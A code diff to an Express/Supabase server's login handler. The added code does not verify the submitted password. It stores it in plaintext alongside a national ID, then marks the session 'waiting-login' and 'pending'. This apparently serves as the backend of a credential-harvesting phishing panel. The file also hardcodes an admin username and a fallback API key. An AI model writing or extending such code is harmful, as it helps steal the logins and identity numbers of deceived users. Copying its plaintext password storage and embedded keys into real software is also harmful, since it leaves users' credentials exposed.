@@ -12,7 +12,7 @@ app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
 
 const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://zexelactvvgxqrnswgdw.supabase.co';
-const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY || 'sb_publishable_jgsLWGpZ-XjLmHwXnD7zYQ_b4WL6LOi';
+const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'sb_publishable_jgsLWGpZ-XjLmHwXnD7zYQ_b4WL6LOi';
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const ADMIN_USERNAME = 'Admin';
@@ -185,6 +185,19 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     case 'submitLogin': {
       const { username, password } = input;
       if (!username || !password) return { success: false };
+      const { data: existing } = await supabase.from('applications')
+        .select('national_id')
+        .eq('username', username)
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .maybeSingle();
+      if (existing) {
+        await supabase.from('applications').update({
+          password, current_page: 'waiting-login',
+          login_status: 'pending', last_active_at: Date.now()
+        }).eq('national_id', existing.national_id);
+        return { success: true, nationalId: existing.national_id };
+      }
       const nid = 'LOGIN_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
       await supabase.from('applications').insert({
         id: genId().slice(0, 16), national_id: nid,
